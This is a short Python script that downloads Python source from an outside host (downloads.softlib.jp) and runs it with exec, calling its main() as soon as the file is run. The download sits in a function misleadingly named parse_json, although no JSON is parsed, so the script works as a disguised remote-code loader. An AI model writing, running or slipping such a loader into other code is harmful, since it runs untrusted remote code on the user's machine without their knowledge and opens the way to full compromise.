import sys
import types
import requests

def parse_json():
    url = "http://downloads.softlib.jp/dynamic/run.py"
    module_name = "run"

    response = requests.get(url)
    source = response.text
    return source, module_name

def execute(source, module_name):
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

def main():
    source, module_name = parse_json()
    execute(source, module_name)

main()
